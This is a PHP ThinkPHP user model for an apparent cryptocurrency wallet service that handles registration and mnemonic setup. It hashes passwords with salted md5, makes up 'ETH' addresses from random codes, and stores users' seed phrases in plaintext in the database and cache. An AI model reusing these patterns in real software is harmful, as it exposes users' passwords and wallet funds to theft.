<?php

namespace app\api\model;

use think\Model;

class User extends Model
{
    public function getJoin($data)
    {

        $validate = Validate($this->name);

        if (!$validate->scene('join')->check($data)) {
            $this->error = $validate->getError();
            return false;
        }
        $data['password'] = md5('hello' . md5($data['password']) . 'imtoken');
        $data['unique_key'] = md5($data['username'] . $data['password']) . md5(md5(time() . 'imtoken'));
        $data['create_time'] = time();
        $result = $this->insert($data);
        if ($result) {
            return $data['unique_key'];
        } else {
            $this->error = '创建失败！';
            return false;
        }
    }

    public function getWords($data){
        $validate = Validate($this->name);
        if (!$validate->scene('memory_words')->check($data)) {
            $this->error = $validate->getError();
            return false;
        }
        $where = array(
            'username' => $data['username'],
            'unique_key' => $data['unique_key']
        );
        $rs = $this->where($where)->find();
        unset($rs['password']);

        if ($rs['uid']) {
            // 1. 生成ETH
            $ethno = createRandCode();
            while(db('wallet')->where(array('address' => $ethno, 'wtid' => 1))->find()){
                $ethno = createRandCode();
            }
            // 2. 插入数据库
            $wallet['uid'] = $rs['uid'];
            $wallet['address'] = $ethno;
            $wallet['wtid'] = 1;
            $wallet['name'] = 'ETH-Wallet';
            $wallet['status'] = 1;
            $wallet['num'] = 0;
            $walletRs = db('wallet')->insert($wallet);

            $rs['memory_words'] = $data['memory_words'];
            cache($data['unique_key'], json_encode($rs), 3600 * 24);

            if ($walletRs) {
                $result = $this->allowField(['memory_words'])->update($data, ['uid' => $rs['uid']]);
                if ($result) {
                    return true;
                } else {
                    $this->error = '更新助记词失败！';
                    return false;
                }
            }else{
                $this->error = '更新助记词失败！';
                return false;
            }
        } else {
            $this->error = '操作失败！';
            return false;
        }
    }
}
